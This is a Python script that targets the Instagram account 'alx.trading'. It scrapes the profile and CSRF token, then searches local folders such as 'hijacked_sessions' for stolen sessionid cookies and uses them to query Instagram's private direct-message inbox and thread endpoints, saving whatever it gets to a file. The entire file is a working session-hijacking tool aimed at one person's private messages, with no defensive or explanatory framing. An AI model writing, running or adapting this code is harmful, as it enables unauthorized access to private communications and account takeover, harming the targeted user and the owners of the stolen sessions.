# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Instagram DM Extractor - Targeting alx.trading
Direct URL targeting with comprehensive session handling
"""

import json
import requests
import time
import sys
from pathlib import Path
from datetime import datetime
import urllib.parse

class AlxTradingExtractor:
    def __init__(self):
        self.target_url = "https://www.instagram.com/alx.trading"
        self.target_username = "alx.trading"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })

    def check_target_exists(self):
        """Check if the exact target URL exists"""
        print(f"🎯 Checking target: {self.target_url}")

        try:
            response = self.session.get(self.target_url, timeout=15)
            print(f"📡 Response status: {response.status_code}")

            if response.status_code == 200:
                content = response.text

                # Check for various indicators
                if "Sorry, this page isn't available" in content:
                    print("❌ Page not available - account may not exist")
                    return False, "page_not_available"
                elif "Page Not Found" in content:
                    print("❌ Page not found")
                    return False, "page_not_found"
                elif '"username":"' in content:
                    print("✅ Account exists and is accessible")
                    # Try to extract username from page
                    try:
                        import re
                        username_match = re.search(r'"username":"([^"]+)"', content)
                        if username_match:
                            actual_username = username_match.group(1)
                            print(f"📍 Actual username: {actual_username}")
                            self.target_username = actual_username
                    except Exception:
                        pass
                    return True, "exists"
                elif "instagram.com" in content:
                    print("✅ Instagram page loaded")
                    return True, "instagram_page"
                else:
                    print("⚠️ Page loaded but format unclear")
                    return True, "unclear"
            else:
                print(f"❌ HTTP error: {response.status_code}")
                return False, f"http_{response.status_code}"

        except Exception as e:
            print(f"❌ Connection error: {e}")
            return False, f"connection_error: {e}"

    def extract_csrf_token(self, content):
        """Extract CSRF token from page content"""
        try:
            import re
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', content)
            if csrf_match:
                return csrf_match.group(1)
        except Exception:
            pass
        return None

    def get_page_data(self):
        """Get the Instagram page and extract data"""
        print("📄 Fetching page data...")

        try:
            response = self.session.get(self.target_url, timeout=15)

            if response.status_code == 200:
                content = response.text

                # Extract useful data
                data = {
                    "url": self.target_url,
                    "status_code": response.status_code,
                    "timestamp": datetime.now().isoformat(),
                    "page_title": None,
                    "csrf_token": None,
                    "user_data": None
                }

                # Extract title
                import re
                title_match = re.search(r'<title>([^<]+)</title>', content)
                if title_match:
                    data["page_title"] = title_match.group(1)

                # Extract CSRF token
                data["csrf_token"] = self.extract_csrf_token(content)

                # Try to extract user data from window._sharedData
                shared_data_match = re.search(r'window\._sharedData = ({.+?});', content)
                if shared_data_match:
                    try:
                        shared_data = json.loads(shared_data_match.group(1))
                        data["shared_data"] = shared_data

                        # Extract user info if available
                        entry_data = shared_data.get("entry_data", {})
                        profile_page = entry_data.get("ProfilePage", [])
                        if profile_page:
                            user_data = profile_page[0].get("graphql", {}).get("user", {})
                            if user_data:
                                data["user_data"] = {
                                    "id": user_data.get("id"),
                                    "username": user_data.get("username"),
                                    "full_name": user_data.get("full_name"),
                                    "biography": user_data.get("biography"),
                                    "follower_count": user_data.get("edge_followed_by", {}).get("count"),
                                    "following_count": user_data.get("edge_follow", {}).get("count"),
                                    "is_private": user_data.get("is_private"),
                                    "is_verified": user_data.get("is_verified")
                                }
                    except Exception as e:
                        print(f"⚠️ Could not parse shared data: {e}")

                return data
            else:
                return {"error": f"HTTP {response.status_code}"}

        except Exception as e:
            return {"error": f"Exception: {e}"}

    def attempt_dm_access(self, session_data=None):
        """Attempt to access DMs if session is available"""
        print("📩 Attempting DM access...")

        if not session_data:
            print("⚠️ No session data provided - cannot access DMs")
            return {"error": "no_session"}

        # Set session cookies
        if "sessionid" in session_data:
            self.session.cookies.set('sessionid', session_data["sessionid"], domain='.instagram.com')

        # Try various DM endpoints
        dm_endpoints = [
            "https://www.instagram.com/api/v1/direct_v2/inbox/",
            "https://www.instagram.com/api/v1/direct_v2/threads/",
            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}"
        ]

        results = {}

        for endpoint in dm_endpoints:
            try:
                print(f"🔍 Trying: {endpoint}")
                response = self.session.get(endpoint, timeout=10)

                results[endpoint] = {
                    "status_code": response.status_code,
                    "success": response.status_code == 200
                }

                if response.status_code == 200:
                    try:
                        data = response.json()
                        results[endpoint]["data"] = data
                        print(f"✅ Success: {endpoint}")
                    except Exception:
                        results[endpoint]["data"] = response.text[:500]
                        print(f"✅ Success (non-JSON): {endpoint}")
                else:
                    print(f"❌ Failed: {endpoint} - {response.status_code}")

            except Exception as e:
                results[endpoint] = {"error": str(e)}
                print(f"❌ Error: {endpoint} - {e}")

        return results

    def find_sessions(self):
        """Find available session files"""
        print("🔍 Searching for session files...")

        session_files = []
        search_paths = [
            "/workspaces/sugarglitch-realops/hijacked_sessions",
            "/workspaces/sugarglitch-realops/sessions",
            "/workspaces/sugarglitch-realops/tools"
        ]

        for search_path in search_paths:
            path_obj = Path(search_path)
            if path_obj.exists():
                for file_path in path_obj.rglob("*.json"):
                    try:
                        with open(file_path, 'r') as f:
                            data = json.load(f)
                            if self.extract_sessionid(data):
                                session_files.append(str(file_path))
                    except Exception:
                        pass

        print(f"📁 Found {len(session_files)} session files")
        return session_files

    def extract_sessionid(self, data):
        """Extract sessionid from various formats"""
        if isinstance(data, str):
            return data
        elif isinstance(data, dict):
            for key in ['sessionid', 'session_id', 'session']:
                if key in data:
                    return str(data[key])
        return None

    def run_extraction(self):
        """Run the complete extraction process"""
        print("🚀 ALX.TRADING DM EXTRACTOR")
        print("=" * 50)

        # Step 1: Check target exists
        exists, status = self.check_target_exists()

        # Step 2: Get page data
        page_data = self.get_page_data()

        # Step 3: Find sessions
        session_files = self.find_sessions()

        # Step 4: Try DM access with available sessions
        dm_results = {}
        for session_file in session_files[:3]:  # Try first 3 sessions
            try:
                with open(session_file, 'r') as f:
                    session_data = json.load(f)
                    sessionid = self.extract_sessionid(session_data)
                    if sessionid:
                        print(f"🔑 Testing session from: {session_file}")
                        dm_result = self.attempt_dm_access({"sessionid": sessionid})
                        dm_results[session_file] = dm_result
            except Exception as e:
                print(f"❌ Session file error: {e}")

        # Compile final results
        final_result = {
            "extraction_info": {
                "target_url": self.target_url,
                "target_username": self.target_username,
                "timestamp": datetime.now().isoformat(),
                "extractor": "alx_trading_targeted"
            },
            "target_status": {
                "exists": exists,
                "status": status
            },
            "page_data": page_data,
            "session_files_found": len(session_files),
            "dm_access_results": dm_results,
            "success": exists and len(dm_results) > 0
        }

        # Save results
        output_file = f"alx_trading_extraction_{int(time.time())}.json"
        with open(output_file, 'w') as f:
            json.dump(final_result, f, indent=2, ensure_ascii=False)

        print(f"\n📁 Results saved to: {output_file}")

        # Summary
        print("\n📊 EXTRACTION SUMMARY:")
        print("=" * 30)
        print(f"✅ Target URL accessible: {exists}")
        print(f"📄 Page data extracted: {'Yes' if page_data.get('user_data') else 'Basic only'}")
        print(f"🔑 Sessions tested: {len(dm_results)}")
        print(f"📩 DM access: {'Attempted' if dm_results else 'No valid sessions'}")

        if page_data.get("user_data"):
            user_info = page_data["user_data"]
            print(f"\n👤 ACCOUNT INFO:")
            print(f"   Username: {user_info.get('username', 'N/A')}")
            print(f"   Full Name: {user_info.get('full_name', 'N/A')}")
            print(f"   Followers: {user_info.get('follower_count', 'N/A')}")
            print(f"   Private: {user_info.get('is_private', 'N/A')}")

        return final_result

def main():
    extractor = AlxTradingExtractor()
    result = extractor.run_extraction()

    if result["success"]:
        print("\n🎉 EXTRACTION COMPLETED!")
    else:
        print("\n⚠️ EXTRACTION INCOMPLETE - Check results for details")

if __name__ == "__main__":
    main()
